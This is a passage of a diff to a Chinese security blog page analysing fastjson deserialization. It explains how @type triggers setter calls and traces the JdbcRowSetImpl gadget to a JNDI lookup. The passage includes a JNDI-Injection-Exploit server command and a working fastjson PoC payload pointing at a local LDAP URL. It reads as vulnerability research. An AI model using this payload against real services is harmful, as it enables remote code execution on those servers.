+ <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>fastjson解析用法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FastjsonDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setAge(<span class="number">23</span>);</span><br><span class="line">        user.setName(<span class="string">&quot;jax&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 將对象转换成json字符串</span></span><br><span class="line">        String str1 = JSONObject.toJSONString(user);</span><br><span class="line">        String str2 = JSONObject.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;str1: &quot;</span>+str1);</span><br><span class="line">        System.out.println(<span class="string">&quot;str2: &quot;</span>+str2);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 將json字符串转换成对象</span></span><br><span class="line">        Object parse1 = JSON.parse(str1);</span><br><span class="line">        <span class="comment">// 获取解析出对象的类型</span></span><br><span class="line">        System.out.println(<span class="string">&quot;@type: &quot;</span> + parse1.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;str1&#x27;s parse1=&gt; &quot;</span> + parse1);</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++&quot;</span>);</span><br><span class="line">        Object parse2 = JSON.parse(str2);</span><br><span class="line">        <span class="comment">// 获取解析出对象的类型</span></span><br><span class="line">        System.out.println(<span class="string">&quot;@type: &quot;</span> + parse2.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;str2&#x27;s parse2=&gt; &quot;</span> + parse2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结果</span></span><br><span class="line">调用了setAge</span><br><span class="line">调用了setName</span><br><span class="line">调用了getAge</span><br><span class="line">调用了getName</span><br><span class="line">调用了getAge</span><br><span class="line">调用了getName</span><br><span class="line">str1: &#123;<span class="string">&quot;age&quot;</span>:<span class="number">23</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;jax&quot;</span>&#125;</span><br><span class="line">str2: &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;typeDemo.User&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">23</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;jax&quot;</span>&#125;</span><br><span class="line">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line"><span class="meta">@type</span>: com.alibaba.fastjson.JSONObject</span><br><span class="line">str1<span class="string">&#x27;s parse1: &#123;&quot;name&quot;:&quot;jax&quot;,&quot;age&quot;:23&#125;</span></span><br><span class="line"><span class="string">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="string">调用了setAge</span></span><br><span class="line"><span class="string">调用了setName</span></span><br><span class="line"><span class="string">@type: typeDemo.User</span></span><br><span class="line"><span class="string">str2&#x27;</span>s parse2: User&#123;name=<span class="string">&#x27;jax&#x27;</span>, age=<span class="number">23</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如上代码运行，查看输出结果，在指定JSONObject.toJSONString()指定SerializerFeature.WriteClassName时，会多出一个@type。在解析成对象时，没有@type属性的对象是JSONObject类型，有@type对象的是User类型，那么可以知道@type 是用于在解析 JSON 时指定类的。</p>
+<p><strong>在JSON.parse(str2)时，会自动调用User类的setter方法</strong>,通过对源码进行分析，在fastjson反序列化过程中需要满足如下条件的setter方法才能被自动调用</p>
+<ol>
+<li>方法名长度不能小于4</li>
+<li>不能是静态方法</li>
+<li>返回的类型必须是void 或者是自己本身</li>
+<li>传入参数个数必须为1</li>
+<li>方法开头必须是set</li>
+</ol>
+<h3 id="JdbcRowSetImpl链分析"><a href="#JdbcRowSetImpl链分析" class="headerlink" title="JdbcRowSetImpl链分析"></a>JdbcRowSetImpl链分析</h3><p>使用jndi注入工具启动ldap服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;calc.exe&quot;</span> -A <span class="string">&quot;127.0.0.1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>poc</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcRowSetImplPoc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        String payload = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/mms7ju\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为调试过程太长，只在几个关键位置打断点</p>
+<p>在JSON.parse(payload)处打断点，跟进parse方法</p>
+<p>跟进下一个断点DefaultJSONParser#DefaultJSONParser(),</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">                    String typeName = lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    			   <span class="comment">// 这步骤实现通过@type获取要对com.sun.rowset.JdbcRowSetImpl类进行反序列化</span></span><br><span class="line">                    Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// 进行反序列化操作</span></span><br><span class="line"><span class="keyword">return</span> deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br></pre></td></tr></table></figure>
+
+<p>因为payload中设置了dataSourceName和autoCommit键，对JdbcRowSetImpl对象进行反序列化时会自动调用</p>
+<p>setDataSourceName()和setAutoCommit,因为这两个方法名都满足上述反序列化过程可以被自动调用的setter方法的五个要求</p>
+<p>后续跟进到JdbcRowSetImpl#setDataSourceName(),对传入的dataSourceName进行赋值操作</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDataSourceName</span><span class="params">(String var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">this</span>.getDataSourceName().equals(var1)) &#123;</span><br><span class="line">                <span class="keyword">super</span>.setDataSourceName(var1);</span><br><span class="line">                <span class="keyword">this</span>.conn = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">this</span>.ps = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">this</span>.rs = <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 设置payload中的dataSourceName值</span></span><br><span class="line">            <span class="keyword">super</span>.setDataSourceName(var1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>继续跟进断点JdbcRowSetImpl#setAutoCommit()</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAutoCommit</span><span class="params">(<span class="keyword">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    	<span class="comment">// 跟进connect()</span></span><br><span class="line">        <span class="keyword">this</span>.conn = <span class="keyword">this</span>.connect();</span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>继续跟进跟进connect()，因为getDataSourceName()获取的值是可控的，对应传入的恶意payload中的dataSourceName值，所以这里的lookup处存在jdni注入，断点放行后，可以弹出计算器</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Connection <span class="title">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.conn;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//此处使用jndi</span></span><br><span class="line">            InitialContext var1 = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            <span class="comment">// 因为getDataSourceName()获取的值是可控的，对应传入的恶意payload中的dataSourceName值，所以这里的lookup处存在jdni注入</span></span><br><span class="line">            DataSource var2 = (DataSource)var1.lookup(<span class="keyword">this</span>.getDataSourceName());</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getUsername() != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.getUsername().equals(<span class="string">&quot;&quot;</span>) ? var2.getConnection(<span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getUrl() != <span class="keyword">null</span> ? DriverManager.getConnection(<span class="keyword">this</span>.getUrl(), <span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/28/cc1-lazymap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="0lh">
+      <meta itemprop="description" content="漏洞分析">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0lh的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/09/28/cc1-lazymap/" class="post-title-link" itemprop="url">apache commons collections 1 漏洞分析-LazyMap版本</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-09-28 11:30:20" itemprop="dateCreated datePublished" datetime="2021-09-28T11:30:20+08:00">2021-09-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-01-26 11:13:51" itemprop="dateModified" datetime="2022-01-26T11:13:51+08:00">2022-01-26</time>
     </span>
 
   
@@ -523,7 +514,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/04/cc1/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/26/cc1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -536,7 +527,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/01/04/cc1/" class="post-title-link" itemprop="url">apache commons collections 1 漏洞挖掘思路分析-TransformedMap版本</a>
+          <a href="/2021/09/26/cc1/" class="post-title-link" itemprop="url">apache commons collections 1 漏洞挖掘思路分析-TransformedMap版本</a>
         </h2>
 
         <div class="post-meta-container">
@@ -546,9 +537,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2022-01-04 11:47:46 / 修改时间：17:19:38" itemprop="dateCreated datePublished" datetime="2022-01-04T11:47:46+08:00">2022-01-04</time>
+      <time title="创建时间：2021-09-26 15:22:30" itemprop="dateCreated datePublished" datetime="2021-09-26T15:22:30+08:00">2021-09-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-01-26 11:13:25" itemprop="dateModified" datetime="2022-01-26T11:13:25+08:00">2022-01-26</time>
     </span>
 
   
